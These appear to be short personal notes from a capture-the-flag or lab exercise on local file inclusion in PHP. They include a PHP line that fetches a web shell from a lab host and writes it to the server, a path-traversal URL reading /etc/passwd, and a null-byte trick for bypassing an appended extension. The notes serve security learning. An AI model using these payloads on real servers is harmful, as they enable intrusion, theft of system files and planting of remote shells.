# LFI
[https://daniel.haxx.se/blog/2020/07/29/curl-ootw-path-as-is/](https://daniel.haxx.se/blog/2020/07/29/curl-ootw-path-as-is/) 

use `curl --path-as-is` for `../../`  

```text-plain
<?php file_put_contents('shell.php',file_get_contents('http://10.17.17.11/shell.php')) ?>
<?php file_get_contents('index.php')?>
```

[http://webapp.thm/get.php?file=../../../../etc/passwd](http://webapp.thm/get.php?file=../../../../etc/passwd)

file\_get\_contents  in PHP allows LFI. also includes function

If server adds a .php extension at the end of file use %00(null byte) to escape the .php extension

../../../../etc/flag2%00 

try changing request type from get to post to see if it accepts payload